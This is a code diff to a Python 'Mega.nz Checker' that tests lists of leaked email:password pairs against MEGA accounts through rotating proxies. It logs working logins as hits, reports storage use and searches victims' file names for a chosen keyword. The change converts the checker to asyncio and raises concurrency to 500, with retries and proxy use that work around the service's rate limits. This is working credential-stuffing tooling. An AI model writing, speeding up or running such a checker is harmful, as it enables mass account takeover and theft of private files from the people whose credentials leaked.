@@ -57,8 +57,8 @@ import time
 import ctypes
 import random
 import threading
-import requests
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import asyncio
+import aiohttp
 from datetime import datetime
 
 import colorama
@@ -104,7 +104,16 @@ class Stats:
         self.customs = 0
         self.fails = 0
         self.errors = 0
+        self.waiting = 0
         self.total = total
+
+    def inc_waiting(self):
+        with self._lock:
+            self.waiting += 1
+            
+    def dec_waiting(self):
+        with self._lock:
+            self.waiting -= 1
 
     def inc_checked(self) -> int:
         with self._lock:
@@ -133,7 +142,7 @@ class Stats:
 
     def snapshot(self) -> tuple:
         with self._lock:
-            return (self.checked, self.hits, self.customs, self.fails, self.errors)
+            return (self.checked, self.hits, self.customs, self.fails, self.errors, self.waiting)
 
 
 # ─── Thread-safe file writer ─────────────────────────────────
@@ -244,120 +253,113 @@ def set_title(title: str):
 
 # ─── Account checker ─────────────────────────────────────────
 
-def check_account(
+async def check_account(
     email: str,
     password: str,
     stats: Stats,
     writer: FileWriter,
     proxy_pool: ProxyPool,
     search_string: str = "",
+    semaphore: asyncio.Semaphore = None
 ):
-    """
-    Check a single MEGA.nz account with retry logic.
-
-    Error handling strategy:
-    - MegaLoginError (-2, -9): wrong password → FAIL (no retry)
-    - MegaBlockedError (-16, -17): blocked/overquota → CUSTOM (no retry)
-    - MegaRateLimitError (-4): rate limited → wait + retry with new proxy
-    - MegaTempError (-3, -6, -18): temp error → short wait + retry
-    - Network errors: retry with exponential backoff
-    """
+    if semaphore:
+        await semaphore.acquire()
+        
     last_error = ""
 
-    for attempt in range(1, MAX_RETRIES + 1):
-        proxy = proxy_pool.get_random() if proxy_pool.available else None
-        client = None
+    try:
+        for attempt in range(1, MAX_RETRIES + 1):
+            proxy = proxy_pool.get_random() if proxy_pool.available else None
+            client = None
 
-        try:
-            client = MegaClient(proxy=proxy)
-            client.login(email, password)
+            try:
+                client = MegaClient(proxy=proxy)
+                await client.login(email, password)
 
-            # Get storage info
-            storage = client.get_storage()
-            used_gb = storage['used_gb']
-            total_gb = storage['total_gb']
+                storage = await client.get_storage()
+                used_gb = storage['used_gb']
+                total_gb = storage['total_gb']
 
-            # Optional keyword search
-            keyword_found = False
-            if search_string:
-                try:
-                    file_names = client.get_file_names()
-                    keyword_found = any(
-                        search_string.lower() in name.lower()
-                        for name in file_names
-                    )
-                except Exception:
-                    keyword_found = False
+                keyword_found = False
+                if search_string:
+                    try:
+                        file_names = await client.get_file_names()
+                        keyword_found = any(
+                            search_string.lower() in name.lower()
+                            for name in file_names
+                        )
+                    except Exception:
+                        keyword_found = False
 
-            # ── HIT ──
-            current = stats.inc_checked()
-            stats.inc_hits()
+                current = stats.inc_checked()
+                stats.inc_hits()
 
-            hit_line = (
-                f"{email}:{password} | "
-                f"Used: {used_gb}GB / {total_gb}GB | "
-                f"Keyword: {search_string or 'N/A'} = "
-                f"{'TRUE' if keyword_found else 'FALSE'} | "
-                f"[{current}/{stats.total}]"
-            )
+                hit_line = (
+                    f"{email}:{password} | "
+                    f"Used: {used_gb}GB / {total_gb}GB | "
+                    f"Keyword: {search_string or 'N/A'} = "
+                    f"{'TRUE' if keyword_found else 'FALSE'} | "
+                    f"[{current}/{stats.total}]"
+                )
 
-            log_hit(hit_line)
-            writer.write(hit_line)
-            return  # success, exit
+                log_hit(hit_line)
+                writer.write(hit_line)
+                return
 
-        except MegaLoginError:
-            # Wrong credentials → no retry
-            current = stats.inc_checked()
-            stats.inc_fails()
-            log_fail(f"{email}:{password} [{current}/{stats.total}]")
-            return
+            except MegaLoginError:
+                current = stats.inc_checked()
+                stats.inc_fails()
+                log_fail(f"{email}:{password} [{current}/{stats.total}]")
+                return
 
-        except MegaBlockedError as e:
-            # Blocked/overquota → no retry
-            current = stats.inc_checked()
-            stats.inc_customs()
-            log_custom(f"{email}:{password} — {e.message} [{current}/{stats.total}]")
-            return
+            except MegaBlockedError as e:
+                current = stats.inc_checked()
+                stats.inc_customs()
+                log_custom(f"{email}:{password} — {e.message} [{current}/{stats.total}]")
+                return
 
-        except MegaRateLimitError as e:
-            last_error = f"Rate limit ({e.code})"
-            if attempt < MAX_RETRIES:
-                log_retry(f"{email} — rate limited, waiting {RATE_LIMIT_DELAY}s (attempt {attempt}/{MAX_RETRIES})")
-                time.sleep(RATE_LIMIT_DELAY)
-                continue
+            except MegaRateLimitError as e:
+                last_error = f"Rate limit ({e.code})"
+                if attempt < MAX_RETRIES:
+                    log_retry(f"{email} — rate limited, waiting {RATE_LIMIT_DELAY}s (attempt {attempt}/{MAX_RETRIES})")
+                    stats.inc_waiting()
+                    await asyncio.sleep(RATE_LIMIT_DELAY)
+                    stats.dec_waiting()
+                    continue
 
-        except MegaTempError as e:
-            last_error = f"Temp error ({e.code})"
-            if attempt < MAX_RETRIES:
-                delay = TEMP_ERROR_DELAY * attempt
-                log_retry(f"{email} — temp error, waiting {delay}s (attempt {attempt}/{MAX_RETRIES})")
-                time.sleep(delay)
-                continue
+            except MegaTempError as e:
+                last_error = f"Temp error ({e.code})"
+                if attempt < MAX_RETRIES:
+                    delay = TEMP_ERROR_DELAY * attempt
+                    log_retry(f"{email} — temp error, waiting {delay}s (attempt {attempt}/{MAX_RETRIES})")
+                    stats.inc_waiting()
+                    await asyncio.sleep(delay)
+                    stats.dec_waiting()
+                    continue
 
-        except (MegaError, requests.RequestException) as e:
-            last_error = str(e)[:100]
-            if attempt < MAX_RETRIES:
-                delay = RETRY_BASE_DELAY * attempt
-                time.sleep(delay)
-                continue
+            except (MegaError, Exception) as e:
+                # Fallback for network and other errors
+                last_error = str(e)[:100]
+                if attempt < MAX_RETRIES:
+                    delay = RETRY_BASE_DELAY * attempt
+                    await asyncio.sleep(delay)
+                    continue
 
-        except Exception as e:
-            last_error = str(e)[:80]
-            if attempt < MAX_RETRIES:
-                time.sleep(RETRY_BASE_DELAY * attempt)
-                continue
+            finally:
+                if client:
+                    await client.close()
 
-        finally:
-            if client:
-                client.close()
-
-    # All retries exhausted
-    current = stats.inc_checked()
-    stats.inc_errors()
-    log_error(f"{email}:{password} — {last_error} [{current}/{stats.total}]")
+        # All retries exhausted
+        current = stats.inc_checked()
+        stats.inc_errors()
+        log_error(f"{email}:{password} — {last_error} [{current}/{stats.total}]")
+        
+    finally:
+        if semaphore:
+            semaphore.release()
 
 
-# ─── Combo parser ─────────────────────────────────────────────
+# ─── Combo parser ─── ─────────────────────────────────────────────
 
 def parse_combo(filepath: str) -> list[tuple[str, str]]:
     """Parse combo file (mail:pass or mail;pass, one per line)."""
@@ -427,12 +429,13 @@ def print_logo():
 def _title_updater(stats: Stats, filename: str, stop: threading.Event):
     """Background thread that updates the console title every 2 seconds."""
     while not stop.is_set():
-        c, h, cu, f, e = stats.snapshot()
+        c, h, cu, f, e, w = stats.snapshot()
         pct = round(c / stats.total * 100, 1) if stats.total > 0 else 0
         set_title(
             f"Mega Checker v3 — "
             f"{pct}% — "
             f"Checked {c}/{stats.total} — "
+            f"Waiting {w} — "
             f"Hits {h} — Custom {cu} — "
             f"Fail {f} — Errors {e} — "
             f"{filename}"
@@ -442,11 +445,10 @@ def _title_updater(stats: Stats, filename: str, stop: threading.Event):
 
 # ─── MAIN ─────────────────────────────────────────────────────
 
-def main():
-    set_title("Mega.nz Checker v3.0")
+async def amain():
+    set_title("Mega.nz Checker v3.0 (Async)")
     print_logo()
 
-    # ── Combo file ──
     combo_path = "combo.txt"
     if not os.path.isfile(combo_path):
         with open(combo_path, "w", encoding="utf-8") as f:
@@ -459,12 +461,10 @@ def main():
     pairs = parse_combo(combo_path)
     if not pairs:
         log_error("No valid email:password pairs found!")
-        input("\nPress Enter to exit...")
         sys.exit(1)
 
     log_info(f"Loaded {len(pairs)} pairs")
 
-    # ── Proxy file ──
     print(f"\n{'═' * 60}")
     proxy_path = input("\n  Proxy file path (or Enter to skip): ").strip()
     proxy_pool = ProxyPool(proxy_path)
@@ -473,27 +473,23 @@ def main():
     else:
         log_info("No proxies — direct connection mode")
 
-    # ── Thread count ──
     print(f"\n{'═' * 60}")
     pool_size = 5
     try:
-        user_input = input(f"\n  Thread count (default {pool_size}, lower if CPU is high): ").strip()
+        user_input = input(f"\n  Concurrent accounts (default {pool_size}): ").strip()
         if user_input:
-            pool_size = max(1, min(int(user_input), 100))
+            pool_size = max(1, min(int(user_input), 500))
     except ValueError:
         pass
-    log_info(f"Threads: {pool_size}")
+    log_info(f"Concurrency: {pool_size}")
 
-    # ── Output file ──
     print(f"\n{'═' * 60}")
     name = input("\n  Output filename (without extension): ").strip() or "results"
-    # Sanitize filename (remove illegal characters)
     for char in '<>:"/\\|?*':
         name = name.replace(char, "")
     filename = f"hits_{name}.txt"
     log_info(f"Hits → {filename}")
 
-    # ── Keyword search ──
     print(f"\n{'═' * 60}")
     search_string = input("\n  Keyword to search in files (or Enter to skip): ").strip()
     if search_string:
@@ -501,21 +497,18 @@ def main():
     else:
         log_info("Keyword search: off")
 
-    # ── Confirmation ──
     print(f"\n{'═' * 60}")
     print(f"\n  {Fore.WHITE}Summary:{Style.RESET_ALL}")
     print(f"  Pairs:    {len(pairs)}")
     print(f"  Proxies:  {proxy_pool.count if proxy_pool.available else 'none (direct)'}")
-    print(f"  Threads:  {pool_size}")
+    print(f"  Concurrency: {pool_size}")
     print(f"  Output:   {filename}")
     print(f"  Keyword:  {search_string or 'disabled'}")
     input(f"\n  Press Enter to start...\n")
 
-    # ── Initialize ──
     stats = Stats(total=len(pairs))
     writer = FileWriter(filename)
 
-    # Background title updater
     stop_event = threading.Event()
     threading.Thread(
         target=_title_updater,
@@ -527,41 +520,25 @@ def main():
     log_info(f"Checking {len(pairs)} accounts...")
     print(f"{'─' * 60}\n")
 
-    # ── Execute ──
-    with ThreadPoolExecutor(max_workers=pool_size) as executor:
-        futures = {}
-        for email, password in pairs:
-            future = executor.submit(
-                check_account,
-                email, password, stats, writer, proxy_pool, search_string
-            )
-            futures[future] = (email, password)
-            
-            # Small staggered delay to prevent "thundering herd" CPU spike 
-            # when many accounts try to do PBKDF2/login crypto simultaneously.
-            if len(futures) < pool_size * 2:
-                time.sleep(0.02)
-            else:
-                time.sleep(0.005)
+    semaphore = asyncio.Semaphore(pool_size)
+    tasks = []
+    for email, password in pairs:
+        tasks.append(
+            asyncio.create_task(check_account(email, password, stats, writer, proxy_pool, search_string, semaphore))
+        )
+        
+    await asyncio.gather(*tasks, return_exceptions=True)
 
-        for future in as_completed(futures):
-            try:
-                future.result()
-            except Exception as e:
-                email, password = futures[future]
-                log_error(f"Unhandled: {email}:{password} — {e}")
-
-    # ── Results ──
     stop_event.set()
     elapsed = round(time.time() - start_time, 1)
-    c, h, cu, f, e = stats.snapshot()
+    c, h, cu, f_c, e, _ = stats.snapshot()
 
     print(f"\n{'═' * 60}")
     print(
         f"\n  {Fore.WHITE}Results:{Style.RESET_ALL}\n"
         f"  {Fore.GREEN}Hits:{Style.RESET_ALL}     {h}\n"
         f"  {Fore.YELLOW}Custom:{Style.RESET_ALL}   {cu}\n"
-        f"  {Fore.RED}Fail:{Style.RESET_ALL}     {f}\n"
+        f"  {Fore.RED}Fail:{Style.RESET_ALL}     {f_c}\n"
         f"  {Fore.MAGENTA}Errors:{Style.RESET_ALL}   {e}\n"
         f"  {Fore.CYAN}Total:{Style.RESET_ALL}    {c}/{stats.total}\n"
         f"  {Fore.CYAN}Time:{Style.RESET_ALL}     {elapsed}s\n"
@@ -569,11 +546,12 @@ def main():
     )
 
     set_title(
-        f"DONE — Hits {h} — Custom {cu} — Fail {f} — Errors {e} — {elapsed}s"
+        f"DONE — Hits {h} — Custom {cu} — Fail {f_c} — Errors {e} — {elapsed}s"
     )
-
     input("  Press Enter to exit...")
 
+def main():
+    asyncio.run(amain())
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
